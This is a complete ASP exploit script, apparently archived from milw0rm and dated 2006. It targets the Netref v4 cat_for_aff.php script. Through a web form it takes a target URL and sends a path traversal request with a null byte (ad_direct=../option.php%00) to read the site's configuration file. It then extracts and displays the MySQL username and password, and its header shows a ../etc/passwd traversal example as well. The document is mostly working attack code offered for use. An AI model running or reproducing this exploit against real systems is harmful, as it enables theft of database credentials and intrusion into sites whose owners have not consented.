<html><head><title>Netref 4 (cat_for_aff.php) Source Code Disclosure Exploit</title></head><pre>&lt;% Response.Buffer = True %&gt;
&lt;% On Error Resume Next %&gt;
&lt;% Server.ScriptTimeout = 100 %&gt;

&lt;%
'===============================================================================================
'                          =&gt;option.php Reader
'[Script Name: Netref 4 (cat_for_aff.php) Source Code Disclosure
'[Coded by   : ajann
'[Author   : ajann
'[Contact    : :(
'[ExploitName: exploit4.asp

'[Note : exploit file name =&gt;exploit4.asp
'[Note : http://[target]/[path]/script/cat_for_aff.php?ad_direct=../etc/passwd    |etc...
'[Using : Write Target after Submit Click
'===============================================================================================

%&gt;

&lt;%
function guvenlik(username)
guvenlik = Replace(username,&quot; // Adresse du serveur MySQL&quot;,&quot;&quot;)
guvenlik = Replace(guvenlik,&quot; // Nom d'utilisateur de la base MySQL &quot;,&quot;&quot;)
guvenlik = Replace(guvenlik,&quot; // Nom d'utilisateur MySQL&quot;,&quot;&quot;)
guvenlik = Replace(guvenlik,&quot; //Mot de passe MySQL&quot;,&quot;&quot;)
guvenlik = Replace(guvenlik,&quot; // Nom de la base MySQL&quot;,&quot;&quot;)
guvenlik = Replace(guvenlik,&quot; // Nom d'utilisateur de la base&quot;,&quot;&quot;)
guvenlik = Replace(guvenlik,&quot; MySQL&quot;,&quot;&quot;)
End Function
%&gt;

&lt;html&gt;
&lt;title&gt;Netref 4 (cat_for_aff.php) Source Code Disclosure&lt;/title&gt;
&lt;head&gt;

&lt;script language=&quot;JavaScript&quot;&gt;    
  function functionControl1(){  
        setTimeout(&quot;functionControl2()&quot;,2000);    
     }  
  
  function functionControl2(){  
            if(document.form1.field1.value==&quot;&quot;){  
 
     alert(&quot;[Exploit Failed]=&gt;The Username and Password Didnt Take,Try Again&quot;);
        
                             }  
                        }

  function writetext() {

            if(document.form1.field1.value==&quot;&quot;){
document.getElementById('htmlAlani').innerHTML='&lt;font face=\&quot;Verdana\&quot; size=\&quot;1\&quot; color=\&quot;#008000\&quot;&gt;There is a problem... The Data Didn\'t Take &lt;/font&gt;'

                            }
                 }
  function write(){  
        setTimeout(&quot;writetext()&quot;,1000);    
     }  
  
&lt;/script&gt;


&lt;/head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1254&quot;&gt;
&lt;body bgcolor=&quot;#000000&quot; link=&quot;#008000&quot; vlink=&quot;#008000&quot; alink=&quot;#008000&quot;&gt;

&lt;center&gt;
&lt;font face=&quot;Verdana&quot; size=&quot;2&quot; color=&quot;#008000&quot;&gt;&lt;b&gt;&lt;a href=&quot;exploit4.asp&quot;&gt;Netref &lt;/b&gt;v4 (cat_for_aff.php) &lt;u&gt;&lt;b&gt;
Source Code Disclosure&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;br&gt;&lt;br&gt;
&lt;table border=&quot;1&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;border-collapse: collapse&quot; width=&quot;35%&quot; id=&quot;AutoNumber1&quot; bordercolorlight=&quot;#808080&quot; bordercolordark=&quot;#008000&quot; bordercolor=&quot;#808080&quot;&gt;
  &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;
    &lt;font face=&quot;Arial&quot; size=&quot;1&quot;&gt;&lt;b&gt;&lt;font color=&quot;#FFFFFF&quot;&gt;TARGET:&lt;/font&gt;Example:[http://x.com/path]&lt;/b&gt;&lt;/font&gt;&lt;p&gt;
    &lt;/td&gt;
    &lt;td width=&quot;50%&quot;&gt;&lt;center&gt;
&lt;form method=&quot;post&quot; name=&quot;form1&quot; action=&quot;exploit4.asp?islem=get&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;text1&quot; value=&quot;http://&quot; size=&quot;25&quot; style=&quot;background-color: #808080&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Get&quot;&gt;&lt;/center&gt;&lt;/td&gt;
  &lt;/tr&gt;

&lt;/table&gt;

&lt;div id=htmlAlani&gt;&lt;/div&gt;

&lt;%
islem = Request.QueryString(&quot;islem&quot;)    
If islem = &quot;hata1&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Please complete to the whole spaces&lt;/font&gt;&quot;
End If
If islem = &quot;hata2&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Please right character use&lt;/font&gt;&quot;
End If
If islem = &quot;hata3&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Add &quot;&quot;http://&quot;&quot;&lt;/font&gt;&quot;
End If
%&gt;

&lt;%  

If islem = &quot;get&quot; Then

string1=&quot;/script&quot;
string2=&quot;/cat_for_aff.php?&quot;
string3=&quot;ad_direct=.&quot;
string4=&quot;./option&quot;
string5=&quot;.php%0&quot;
string6=&quot;0&quot;

targettext = Request.Form(&quot;text1&quot;)
arama=InStr(1, targettext, &quot;union&quot; ,1)
arama2=InStr(1, targettext, &quot;http://&quot; ,1)

If targettext=&quot;&quot; Then
Response.Redirect(&quot;exploit4.asp?islem=hata1&quot;)

Else
If arama&gt;0 then 
Response.Redirect(&quot;exploit4.asp?islem=hata2&quot;)

Else
If arama2=0 then 
Response.Redirect(&quot;exploit4.asp?islem=hata3&quot;)

Else
%&gt; 

&lt;%

target1 = targettext+string1+string2+string3+string4+string5+string6

Public Function take(come)
Set objtake = Server.CreateObject(&quot;Microsoft.XMLHTTP&quot; )
With objtake
  .Open &quot;GET&quot; , come, FALSE
  .sEnd
take =  .Responsetext
End With
SET objtake = Nothing
End Function

get_username = take(target1)

getdata=InStr(get_username,&quot;&lt;?&quot; )
username=Mid(get_username,getdata+3,180)


%&gt;


&lt;center&gt;
&lt;font face=&quot;Verdana&quot; size=&quot;2&quot; color=&quot;#008000&quot;&gt; &lt;u&gt;&lt;b&gt;
ajann&lt;br&gt;&lt;/b&gt;&lt;/u&gt;&lt;/font&gt;
&lt;table border=&quot;1&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;border-collapse: collapse&quot; width=&quot;35%&quot; id=&quot;AutoNumber1&quot; bordercolorlight=&quot;#808080&quot; bordercolordark=&quot;#008000&quot; bordercolor=&quot;#808080&quot;&gt;
  &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
    &lt;b&gt;&lt;font size=&quot;2&quot; face=&quot;Arial&quot;&gt;Data:&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
    &lt;td width=&quot;80%&quot;&gt;
&amp;nbsp;&lt;b&gt;&lt;font color=&quot;#C0C0C0&quot; size=&quot;2&quot; face=&quot;Verdana&quot;&gt;&lt;%=guvenlik(username)%&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;
 &lt;/td&gt;
  &lt;/tr&gt;
  
&lt;/table&gt;

&lt;form method=&quot;POST&quot; name=&quot;form2&quot; action=&quot;#&quot;&gt;    
&lt;input type=&quot;hidden&quot; name=&quot;field1&quot; size=&quot;20&quot; value=&quot;&lt;%=username%&gt;&quot;&gt;&lt;/p&gt;      
&lt;/form&gt; 

&lt;/center&gt;

&lt;script language=&quot;JavaScript&quot;&gt;
write()
functionControl1()
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;

&lt;%
End If
End If
End If
End If
Set objtake = Nothing 
%&gt;

# milw0rm.com [2006-10-29]</pre></html>